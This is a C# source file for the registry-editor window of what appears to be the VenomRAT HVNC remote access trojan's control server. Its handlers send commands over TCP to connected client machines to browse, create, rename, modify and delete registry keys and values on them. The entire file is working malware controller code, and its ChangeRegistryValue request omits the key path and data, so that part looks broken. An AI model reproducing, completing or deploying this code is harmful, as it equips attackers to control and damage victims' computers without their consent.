using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormRegistryEditor : Form
    {
        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        internal Clients ParentClient { get; set; }

        public FormRegistryEditor()
        {
            this.InitializeComponent();
        }

        private void FrmRegistryEditor_Load(object sender, EventArgs e)
        {
            if (!this.ParentClient.Admin)
            {
                MessageBox.Show("The client software is not running as administrator and therefore some functionality like Update, Create, Open and Delete may not work properly!", "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void AddRootKey(RegistrySeeker.RegSeekerMatch match)
        {
            TreeNode treeNode = this.CreateNode(match.Key, match.Key, match.Data);
            treeNode.Nodes.Add(new TreeNode());
            this.tvRegistryDirectory.Nodes.Add(treeNode);
        }

        private TreeNode AddKeyToTree(TreeNode parent, RegistrySeeker.RegSeekerMatch subKey)
        {
            TreeNode treeNode = this.CreateNode(subKey.Key, subKey.Key, subKey.Data);
            parent.Nodes.Add(treeNode);
            if (subKey.HasSubKeys)
            {
                treeNode.Nodes.Add(new TreeNode());
            }
            return treeNode;
        }

        private TreeNode CreateNode(string key, string text, object tag)
        {
            return new TreeNode
            {
                Text = text,
                Name = key,
                Tag = tag
            };
        }

        public void AddKeys(string rootKey, RegistrySeeker.RegSeekerMatch[] matches)
        {
            if (string.IsNullOrEmpty(rootKey))
            {
                this.tvRegistryDirectory.BeginUpdate();
                foreach (RegistrySeeker.RegSeekerMatch match in matches)
                {
                    this.AddRootKey(match);
                }
                this.tvRegistryDirectory.SelectedNode = this.tvRegistryDirectory.Nodes[0];
                this.tvRegistryDirectory.EndUpdate();
                return;
            }
            TreeNode treeNode = this.GetTreeNode(rootKey);
            if (treeNode != null)
            {
                this.tvRegistryDirectory.BeginUpdate();
                foreach (RegistrySeeker.RegSeekerMatch subKey in matches)
                {
                    this.AddKeyToTree(treeNode, subKey);
                }
                treeNode.Expand();
                this.tvRegistryDirectory.EndUpdate();
            }
        }

        public void CreateNewKey(string rootKey, RegistrySeeker.RegSeekerMatch match)
        {
            TreeNode treeNode = this.GetTreeNode(rootKey);
            TreeNode treeNode2 = this.AddKeyToTree(treeNode, match);
            treeNode2.EnsureVisible();
            this.tvRegistryDirectory.SelectedNode = treeNode2;
            treeNode2.Expand();
            this.tvRegistryDirectory.LabelEdit = true;
            treeNode2.BeginEdit();
        }

        public void DeleteKey(string rootKey, string subKey)
        {
            TreeNode treeNode = this.GetTreeNode(rootKey);
            if (treeNode.Nodes.ContainsKey(subKey))
            {
                treeNode.Nodes.RemoveByKey(subKey);
            }
        }

        public void RenameKey(string rootKey, string oldName, string newName)
        {
            TreeNode treeNode = this.GetTreeNode(rootKey);
            if (treeNode.Nodes.ContainsKey(oldName))
            {
                treeNode.Nodes[oldName].Text = newName;
                treeNode.Nodes[oldName].Name = newName;
                this.tvRegistryDirectory.SelectedNode = treeNode.Nodes[newName];
            }
        }

        private TreeNode GetTreeNode(string path)
        {
            string[] array = path.Split(new char[] { '\\' });
            TreeNode treeNode = this.tvRegistryDirectory.Nodes[array[0]];
            if (treeNode == null)
            {
                return null;
            }
            for (int i = 1; i < array.Length; i++)
            {
                treeNode = treeNode.Nodes[array[i]];
                if (treeNode == null)
                {
                    return null;
                }
            }
            return treeNode;
        }

        public void CreateValue(string keyPath, RegistrySeeker.RegValueData value)
        {
            TreeNode treeNode = this.GetTreeNode(keyPath);
            if (treeNode != null)
            {
                List<RegistrySeeker.RegValueData> list = ((RegistrySeeker.RegValueData[])treeNode.Tag).ToList<RegistrySeeker.RegValueData>();
                list.Add(value);
                treeNode.Tag = list.ToArray();
                if (this.tvRegistryDirectory.SelectedNode == treeNode)
                {
                    RegistryValueLstItem registryValueLstItem = new RegistryValueLstItem(value);
                    this.lstRegistryValues.Items.Add(registryValueLstItem);
                    this.lstRegistryValues.SelectedIndices.Clear();
                    registryValueLstItem.Selected = true;
                    this.lstRegistryValues.LabelEdit = true;
                    registryValueLstItem.BeginEdit();
                }
                this.tvRegistryDirectory.SelectedNode = treeNode;
            }
        }

        public void DeleteValue(string keyPath, string valueName)
        {
            TreeNode treeNode = this.GetTreeNode(keyPath);
            if (treeNode != null)
            {
                if (!RegValueHelper.IsDefaultValue(valueName))
                {
                    treeNode.Tag = (from value in (RegistrySeeker.RegValueData[])treeNode.Tag
                                    where value.Name != valueName
                                    select value).ToArray<RegistrySeeker.RegValueData>();
                    if (this.tvRegistryDirectory.SelectedNode == treeNode)
                    {
                        this.lstRegistryValues.Items.RemoveByKey(valueName);
                    }
                }
                else
                {
                    RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == valueName);
                    if (this.tvRegistryDirectory.SelectedNode == treeNode)
                    {
                        RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == valueName);
                        if (registryValueLstItem != null)
                        {
                            registryValueLstItem.Data = regValueData.Kind.RegistryTypeToString(null);
                        }
                    }
                }
                this.tvRegistryDirectory.SelectedNode = treeNode;
            }
        }

        public void RenameValue(string keyPath, string oldName, string newName)
        {
            TreeNode treeNode = this.GetTreeNode(keyPath);
            if (treeNode != null)
            {
                RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == oldName);
                regValueData.Name = newName;
                if (this.tvRegistryDirectory.SelectedNode == treeNode)
                {
                    RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == oldName);
                    if (registryValueLstItem != null)
                    {
                        registryValueLstItem.RegName = newName;
                    }
                }
                this.tvRegistryDirectory.SelectedNode = treeNode;
            }
        }

        public void ChangeValue(string keyPath, RegistrySeeker.RegValueData value)
        {
            TreeNode treeNode = this.GetTreeNode(keyPath);
            if (treeNode != null)
            {
                RegistrySeeker.RegValueData dest = ((RegistrySeeker.RegValueData[])treeNode.Tag).First((RegistrySeeker.RegValueData item) => item.Name == value.Name);
                this.ChangeRegistryValue(value, dest);
                if (this.tvRegistryDirectory.SelectedNode == treeNode)
                {
                    RegistryValueLstItem registryValueLstItem = this.lstRegistryValues.Items.Cast<RegistryValueLstItem>().SingleOrDefault((RegistryValueLstItem item) => item.Name == value.Name);
                    if (registryValueLstItem != null)
                    {
                        registryValueLstItem.Data = RegValueHelper.RegistryValueToString(value);
                    }
                }
                this.tvRegistryDirectory.SelectedNode = treeNode;
            }
        }

        private void ChangeRegistryValue(RegistrySeeker.RegValueData source, RegistrySeeker.RegValueData dest)
        {
            if (source.Kind != dest.Kind)
            {
                return;
            }
            dest.Data = source.Data;
        }

        private void UpdateLstRegistryValues(TreeNode node)
        {
            this.selectedStripStatusLabel.Text = node.FullPath;
            RegistrySeeker.RegValueData[] values = (RegistrySeeker.RegValueData[])node.Tag;
            this.PopulateLstRegistryValues(values);
        }

        private void PopulateLstRegistryValues(RegistrySeeker.RegValueData[] values)
        {
            this.lstRegistryValues.BeginUpdate();
            this.lstRegistryValues.Items.Clear();
            values = (from value in values
                      orderby value.Name
                      select value).ToArray<RegistrySeeker.RegValueData>();
            foreach (RegistrySeeker.RegValueData value3 in values)
            {
                RegistryValueLstItem value2 = new RegistryValueLstItem(value3);
                this.lstRegistryValues.Items.Add(value2);
            }
            this.lstRegistryValues.EndUpdate();
        }

        private void tvRegistryDirectory_AfterLabelEdit(object sender, NodeLabelEditEventArgs e)
        {
            if (e.Label == null)
            {
                this.tvRegistryDirectory.LabelEdit = false;
                return;
            }
            e.CancelEdit = true;
            if (e.Label.Length <= 0)
            {
                MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                e.Node.BeginEdit();
                return;
            }
            if (e.Node.Parent.Nodes.ContainsKey(e.Label))
            {
                MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                e.Node.BeginEdit();
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "RenameRegistryKey";
            msgPack.ForcePathObject("OldKeyName").AsString = e.Node.Name;
            msgPack.ForcePathObject("NewKeyName").AsString = e.Label;
            msgPack.ForcePathObject("ParentPath").AsString = e.Node.Parent.FullPath;
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            this.tvRegistryDirectory.LabelEdit = false;
        }

        private void tvRegistryDirectory_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            TreeNode node = e.Node;
            if (string.IsNullOrEmpty(node.FirstNode.Name))
            {
                this.tvRegistryDirectory.SuspendLayout();
                node.Nodes.Clear();
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "LoadRegistryKey";
                msgPack.ForcePathObject("RootKeyName").AsString = node.FullPath;
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                Thread.Sleep(500);
                this.tvRegistryDirectory.ResumeLayout();
                e.Cancel = true;
            }
        }

        private void tvRegistryDirectory_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                this.tvRegistryDirectory.SelectedNode = e.Node;
                Point position = new Point(e.X, e.Y);
                this.CreateTreeViewMenuStrip();
                this.tv_ContextMenuStrip.Show(this.tvRegistryDirectory, position);
            }
        }

        private void tvRegistryDirectory_BeforeSelect(object sender, TreeViewCancelEventArgs e)
        {
            this.UpdateLstRegistryValues(e.Node);
        }

        private void tvRegistryDirectory_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete && this.GetDeleteState())
            {
                this.deleteRegistryKey_Click(this, e);
            }
        }

        private void CreateEditToolStrip()
        {
            this.modifyToolStripMenuItem1.Visible = (this.modifyBinaryDataToolStripMenuItem1.Visible = (this.modifyNewtoolStripSeparator.Visible = this.lstRegistryValues.Focused));
            this.modifyToolStripMenuItem1.Enabled = (this.modifyBinaryDataToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1);
            this.renameToolStripMenuItem2.Enabled = this.GetRenameState();
            this.deleteToolStripMenuItem2.Enabled = this.GetDeleteState();
        }

        private void CreateTreeViewMenuStrip()
        {
            this.renameToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
            this.deleteToolStripMenuItem.Enabled = this.tvRegistryDirectory.SelectedNode.Parent != null;
        }

        private void CreateListViewMenuStrip()
        {
            this.modifyToolStripMenuItem.Enabled = (this.modifyBinaryDataToolStripMenuItem.Enabled = this.lstRegistryValues.SelectedItems.Count == 1);
            this.renameToolStripMenuItem1.Enabled = this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
            this.deleteToolStripMenuItem1.Enabled = this.tvRegistryDirectory.SelectedNode != null && this.lstRegistryValues.SelectedItems.Count > 0;
        }

        private void editToolStripMenuItem_DropDownOpening(object sender, EventArgs e)
        {
            this.CreateEditToolStrip();
        }

        private void menuStripExit_Click(object sender, EventArgs e)
        {
            base.Close();
        }

        private void menuStripDelete_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.Focused)
            {
                this.deleteRegistryKey_Click(this, e);
                return;
            }
            if (this.lstRegistryValues.Focused)
            {
                this.deleteRegistryValue_Click(this, e);
            }
        }

        private void menuStripRename_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.Focused)
            {
                this.renameRegistryKey_Click(this, e);
                return;
            }
            if (this.lstRegistryValues.Focused)
            {
                this.renameRegistryValue_Click(this, e);
            }
        }

        private void lstRegistryKeys_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                Point position = new Point(e.X, e.Y);
                if (this.lstRegistryValues.GetItemAt(position.X, position.Y) == null)
                {
                    this.lst_ContextMenuStrip.Show(this.lstRegistryValues, position);
                    return;
                }
                this.CreateListViewMenuStrip();
                this.selectedItem_ContextMenuStrip.Show(this.lstRegistryValues, position);
            }
        }

        private void lstRegistryKeys_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            if (e.Label == null || this.tvRegistryDirectory.SelectedNode == null)
            {
                this.lstRegistryValues.LabelEdit = false;
                return;
            }
            e.CancelEdit = true;
            int item = e.Item;
            if (e.Label.Length <= 0)
            {
                MessageBox.Show("Invalid label. \nThe label cannot be blank.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                this.lstRegistryValues.Items[item].BeginEdit();
                return;
            }
            if (this.lstRegistryValues.Items.ContainsKey(e.Label))
            {
                MessageBox.Show("Invalid label. \nA node with that label already exists.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                this.lstRegistryValues.Items[item].BeginEdit();
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "RenameRegistryValue";
            msgPack.ForcePathObject("OldValueName").AsString = this.lstRegistryValues.Items[item].Name;
            msgPack.ForcePathObject("NewValueName").AsString = e.Label;
            msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            this.lstRegistryValues.LabelEdit = false;
        }

        private void lstRegistryKeys_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete && this.GetDeleteState())
            {
                this.deleteRegistryValue_Click(this, e);
            }
        }

        private void createNewRegistryKey_Click(object sender, EventArgs e)
        {
            if (!this.tvRegistryDirectory.SelectedNode.IsExpanded && this.tvRegistryDirectory.SelectedNode.Nodes.Count > 0)
            {
                this.tvRegistryDirectory.AfterExpand += this.createRegistryKey_AfterExpand;
                this.tvRegistryDirectory.SelectedNode.Expand();
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
            msgPack.ForcePathObject("Command").AsString = "CreateRegistryKey";
            msgPack.ForcePathObject("ParentPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
        }

        private void deleteRegistryKey_Click(object sender, EventArgs e)
        {
            string text = "Are you sure you want to permanently delete this key and all of its subkeys?";
            string caption = "Confirm Key Delete";
            DialogResult dialogResult = MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
            if (dialogResult == DialogResult.Yes)
            {
                string fullPath = this.tvRegistryDirectory.SelectedNode.Parent.FullPath;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "DeleteRegistryKey";
                msgPack.ForcePathObject("KeyName").AsString = this.tvRegistryDirectory.SelectedNode.Name;
                msgPack.ForcePathObject("ParentPath").AsString = fullPath;
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private void renameRegistryKey_Click(object sender, EventArgs e)
        {
            this.tvRegistryDirectory.LabelEdit = true;
            this.tvRegistryDirectory.SelectedNode.BeginEdit();
        }

        private void createStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "1";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private void createBinaryRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "3";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private void createDwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "4";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private void createQwordRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "11";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private void createMultiStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "7";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private void createExpandStringRegistryValue_Click(object sender, EventArgs e)
        {
            if (this.tvRegistryDirectory.SelectedNode != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgPack.ForcePathObject("Command").AsString = "CreateRegistryValue";
                msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                msgPack.ForcePathObject("Kindstring").AsString = "2";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        private void deleteRegistryValue_Click(object sender, EventArgs e)
        {
            string text = "Deleting certain registry values could cause system instability. Are you sure you want to permanently delete " + ((this.lstRegistryValues.SelectedItems.Count == 1) ? "this value?" : "these values?");
            string caption = "Confirm Value Delete";
            DialogResult dialogResult = MessageBox.Show(text, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
            if (dialogResult == DialogResult.Yes)
            {
                foreach (object obj in this.lstRegistryValues.SelectedItems)
                {
                    if (obj.GetType() == typeof(RegistryValueLstItem))
                    {
                        RegistryValueLstItem registryValueLstItem = (RegistryValueLstItem)obj;
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                        msgPack.ForcePathObject("Command").AsString = "DeleteRegistryValue";
                        msgPack.ForcePathObject("KeyPath").AsString = this.tvRegistryDirectory.SelectedNode.FullPath;
                        msgPack.ForcePathObject("ValueName").AsString = registryValueLstItem.RegName;
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                    }
                }
            }
        }

        private void renameRegistryValue_Click(object sender, EventArgs e)
        {
            this.lstRegistryValues.LabelEdit = true;
            this.lstRegistryValues.SelectedItems[0].BeginEdit();
        }

        private void modifyRegistryValue_Click(object sender, EventArgs e)
        {
            this.CreateEditForm(false);
        }

        private void modifyBinaryDataRegistryValue_Click(object sender, EventArgs e)
        {
            this.CreateEditForm(true);
        }

        private void createRegistryKey_AfterExpand(object sender, TreeViewEventArgs e)
        {
            if (e.Node == this.tvRegistryDirectory.SelectedNode)
            {
                this.createNewRegistryKey_Click(this, e);
                this.tvRegistryDirectory.AfterExpand -= this.createRegistryKey_AfterExpand;
            }
        }

        private bool GetDeleteState()
        {
            if (this.lstRegistryValues.Focused)
            {
                return this.lstRegistryValues.SelectedItems.Count > 0;
            }
            return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
        }

        private bool GetRenameState()
        {
            if (this.lstRegistryValues.Focused)
            {
                return this.lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(this.lstRegistryValues.SelectedItems[0].Name);
            }
            return this.tvRegistryDirectory.Focused && this.tvRegistryDirectory.SelectedNode != null && this.tvRegistryDirectory.SelectedNode.Parent != null;
        }

        private Form GetEditForm(RegistrySeeker.RegValueData value, RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return new FormRegValueEditString(value);

                case RegistryValueKind.Binary:
                    return new FormRegValueEditBinary(value);

                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    return new FormRegValueEditWord(value);

                case RegistryValueKind.MultiString:
                    return new FormRegValueEditMultiString(value);
            }
            return null;
        }

        private void CreateEditForm(bool isBinary)
        {
            string fullPath = this.tvRegistryDirectory.SelectedNode.FullPath;
            string name = this.lstRegistryValues.SelectedItems[0].Name;
            RegistrySeeker.RegValueData regValueData = ((RegistrySeeker.RegValueData[])this.tvRegistryDirectory.SelectedNode.Tag).ToList<RegistrySeeker.RegValueData>().Find((RegistrySeeker.RegValueData item) => item.Name == name);
            RegistryValueKind valueKind = (isBinary ? RegistryValueKind.Binary : regValueData.Kind);
            using (Form editForm = this.GetEditForm(regValueData, valueKind))
            {
                if (editForm.ShowDialog() == DialogResult.OK)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "regManager";
                    msgPack.ForcePathObject("Command").AsString = "ChangeRegistryValue";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
        }

        public void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        private void FormRegistryEditor_FormClosed(object sender, FormClosedEventArgs e)
        {
            ThreadPool.QueueUserWorkItem(delegate (object o)
            {
                Clients client = this.Client;
                if (client == null)
                {
                    return;
                }
                client.Disconnected();
            });
        }
    }
}
